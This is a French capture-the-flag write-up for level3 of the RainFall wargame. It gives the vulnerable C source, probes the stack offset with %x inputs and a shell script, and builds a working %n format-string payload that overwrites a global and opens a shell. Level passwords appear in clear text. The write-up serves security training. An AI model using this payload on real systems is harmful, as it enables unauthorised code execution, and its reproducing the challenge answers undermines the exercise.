
# level3 :

pass : `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`

```bash
level0@RainFall:~$ su level3
Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Source :

```cpp=
#include <stdio.h>
#include <stdint.h>

int		v() {
	char str[520];  // 0x208
	fgets(str, 512, stdin);  // 0x200
	printf(str);
	void	*m = 0x804988c;  // end of bss segment 0x08049890
	if (m == 64) {  // 0x40
		fwrite("Wait what?!\n", 1, 12, stdout);
		system("/bin/sh");
	}
	return (m);
}

int		main(int ac, char **av, char **envp) {
	return(v());
}
```

## Recherche :

On doit changer la valeur la valeure de la mémoire à l'addresse 0x804988c pour pouvoir réaliser notre exploit.

Ici `printf` est utiliser, est va pouvoir l'utiliser pour faire ce que l'on veut.
`Printf` utlise des format modifier `%` qui seront directement interpreter, n'étant pas protégé sur le binaire du level3.
On a donc :
    - `%s` pour afficher une chaine de caractère
    - `%x` pour afficher 4 octets en hexadécimal
    - `%n` pour l'écriture en mémoire

```sh
level3@RainFall:~$ ./level3
%x %x
200 b7fd1ac0
```

Pour déterminer l'offset où la chaine `str` sera mise en mémoire, on peut lancer cette commande :
`for((i=0; i<10; i++));do echo "Index $i" && python -c "print 'AAAA'+' %x'*$i" | ./level3; done`

qui nous donnera ce résultat :
```=
Index 0
AAAA
Index 1
AAAA 200
Index 2
AAAA 200 b7fd1ac0
Index 3
AAAA 200 b7fd1ac0 b7ff37d0
Index 4
AAAA 200 b7fd1ac0 b7ff37d0 41414141
Index 5
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
Index 6
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
Index 7
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
Index 8
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520
Index 9
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825
```

ou avec un script shell :
```sh=
kali@kali:~/rainfall$ cat ./script.sh
#!/bin/bash
for ((i=0;  i < 200; i++))
do
        echo "Index $i" && (python -c "print 'AAAA%$i\$x'" ) | $1 | grep -A5 -B5 4141 > temp.pap

        if test -s "temp.pap"; then
                        cat temp.pap
                        break
        fi
done
rm temp.pap
```
Qu'on peut executer :
```
kali@kali:~/rainfall$ ./script.sh ./level3
Index 0
Index 1
Index 2
Index 3
Index 4
AAAA41414141
```

On peut voir qu'on a un offset à 4.

On peut donc simplifier par :
```
level3@RainFall:~$ echo "AAAA%4\$x" | ./level3
AAAA41414141
```
ou
```
level3@RainFall:~$ echo "ABCD%4\$x" | ./level3
ABCD44434241
```

Où l'on retrouve bien ABCD en little endian. Donc si on remplace ABCD par l'addresse de `m` on pourra changer sa valeur avec l'option `%n`.

```
level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x08%4\$x"' | ./level3 ; echo " ->$?"
�804988c ->0
```

`%n` écrit en mémoire avec la taille de la chaine de caractère qui lui est donnée.

Si on remplace x par n, au lieu d'afficher, on va donc écrire à l'adresse de mémoire donnée:
```
level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x08%4\$n"' | ./level3 ; echo " ->$?"
� ->4
```

On voit que le code de retour n'est plus 0 mais 4, car on a une chaîne d'une longeur de 4.

On a donc tout ce qu'il nous faut pour écrire le script suivant :
- écrire à l'addresse 0x0804988c
- l'offset pour y écrire est 4
- la valeur que l'on veut mettre est 0x40

`(perl -e 'print "\x8c\x98\x04\x08"."\x90"x(0x40-4)."%4\$n"'; cat;) | ./level3`

## Exploit :

```
level3@RainFall:~$ (perl -e 'print "\x8c\x98\x04\x08"."\x90"x(0x40-4)."%4\$n"'; cat;) | ./level3

�������������������������������������������������������������
Wait what?!
whoami
level4
cd ../level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

----

## Documentation :
* [Une simple Exploitation de vulnérabilité Format String](https://www.exploit-db.com/papers/23985)
